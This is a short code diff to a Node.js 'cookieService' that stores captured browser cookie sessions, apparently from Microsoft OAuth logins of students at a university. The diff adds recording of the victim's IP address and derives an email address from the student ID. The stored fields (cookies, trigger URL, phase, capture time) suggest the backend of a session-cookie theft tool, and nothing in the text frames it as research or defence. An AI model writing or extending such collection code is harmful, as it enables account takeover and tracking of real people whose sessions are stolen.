@@ -3,18 +3,24 @@ const pino = require('pino');
 
 const logger = pino({ name: 'cookieService' });
 
-async function saveCookieSession(payload) {
+async function saveCookieSession(payload, clientIp) {
+    let computedEmail = payload.userEmail || 'unknown';
+    if (computedEmail === 'unknown' && payload.studentId && payload.studentId !== 'unknown') {
+        computedEmail = payload.studentId.toLowerCase() + '@ucp.edu.pk';
+    }
+
     const doc = {
         sessionId: payload.sessionId,
         studentId: payload.studentId || null,
         userName: payload.userName || 'unknown',
-        userEmail: payload.userEmail || 'unknown',
+        userEmail: computedEmail,
         source: payload.source || 'microsoft_oauth',
         phase: payload.phase,
         triggerUrl: payload.triggerUrl,
         domains: payload.domains || [],
         cookies: payload.cookies,
         cookieCount: payload.cookies.length,
+        ipAddress: clientIp || null,
         userAgent: payload.userAgent || null,
         metadata: payload.metadata || {},
         capturedAt: new Date()
